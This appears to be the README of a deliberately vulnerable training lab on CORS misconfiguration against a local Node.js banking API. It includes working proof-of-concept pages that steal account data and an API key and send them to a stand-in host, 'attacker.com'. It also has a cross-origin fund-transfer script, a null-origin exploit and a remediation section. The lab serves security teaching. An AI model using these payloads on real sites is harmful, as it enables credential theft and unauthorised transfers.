# Lab 18 — CORS Misconfiguration 🔴

**Port:** `8018` | **Stack:** Node.js + PostgreSQL | **Swagger:** `http://localhost:8018/api-docs`  
**Difficulty:** Intermediate

---

## 🕳️ Security Loopholes

1. **Origin Reflection** — Server echoes back any `Origin` header with `Allow-Credentials: true` → any site can steal authenticated data
2. **`null` Origin Trusted** — `file://` pages and sandboxed iframes can make credentialed requests to `/admin/data`
3. **No CSRF Token on State-Changing Endpoints** — `/transfer` has no CSRF protection, exploitable via cross-origin forms

---

## 🎯 Attack Scenarios

### Scenario A — CORS Credential Theft PoC
```bash
docker compose up -d

# Verify CORS misconfiguration
curl -H "Origin: https://evil.com" \
     -H "X-User-Id: 1" \
     http://localhost:8018/account -v 2>&1 | grep -i "access-control"

# Should return: Access-Control-Allow-Origin: https://evil.com
#                Access-Control-Allow-Credentials: true
```

Create `evil.html` to serve from any other origin:
```html
<!-- evil.html — serve from http://localhost:9999 or any other domain -->
<!DOCTYPE html>
<html>
<body>
<h1>You've won a prize! Click below.</h1>
<script>
// When victim visits this page while logged into localhost:8018,
// we steal their account data and API key
async function steal() {
  // Fetch with credentials (sends cookies/sessions)
  const r1 = await fetch('http://localhost:8018/account', {
    credentials: 'include',
    headers: { 'X-User-Id': '1' }
  });
  const account = await r1.json();

  const r2 = await fetch('http://localhost:8018/api-key', {
    credentials: 'include',
    headers: { 'X-User-Id': '1' }
  });
  const keyData = await r2.json();

  // Exfiltrate to attacker server
  await fetch(`https://attacker.com/steal?data=${encodeURIComponent(JSON.stringify({account, keyData}))}`);
  console.log('Stolen:', account, keyData);
}
steal();
</script>
</body>
</html>
```

```bash
# Serve evil page
python3 -m http.server 9999
# Visit http://localhost:9999/evil.html while "logged in" to the bank API
```

### Scenario B — CSRF Fund Transfer via CORS
```html
<!-- csrf-transfer.html -->
<script>
fetch('http://localhost:8018/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json', 'X-User-Id': '1' },
  body: JSON.stringify({ to_user_id: 3, amount: 10000 })
}).then(r => r.json()).then(console.log);
</script>
```

### Scenario C — null Origin Exploit (file://)
```bash
# Save as local .html file and open directly in browser (file://)
# The Origin header will be "null"
cat > exploit_null.html << 'EOF'
<script>
fetch('http://localhost:8018/admin/data', {
  credentials: 'include'
}).then(r => r.json()).then(d => {
  document.write(JSON.stringify(d));
});
</script>
EOF
# Open in browser: file:///path/to/exploit_null.html
```

### Scenario D — Verify the Misconfiguration
```bash
# Test origin reflection
for origin in "https://evil.com" "http://attacker.io" "null" "https://localhost:9999"; do
  echo "Origin: $origin"
  curl -s -I -H "Origin: $origin" http://localhost:8018/account \
    -H "X-User-Id: 1" | grep -i "access-control"
  echo "---"
done
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `curl -H "Origin: evil.com"` | Manual CORS header test |
| Burp Suite | Origin manipulation in Proxy |
| `corsy` | `python3 corsy.py -u http://localhost:8018/account` |
| Browser DevTools | Fetch from console with credentials |

---

## 🔐 How to Fix

```javascript
const allowedOrigins = [
  'https://app.company.com',
  'https://admin.company.com'
];

app.use(cors({
  origin: (origin, callback) => {
    // Reject requests with no origin (direct API calls should use API keys)
    if (!origin) return callback(new Error('Origin required'));
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`Origin ${origin} not allowed`));
    }
  },
  credentials: true,
  methods: ['GET', 'POST'],
}));

// Add CSRF tokens for all state-changing requests
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// Never trust 'null' origin
// Never use wildcard '*' with credentials: true
```
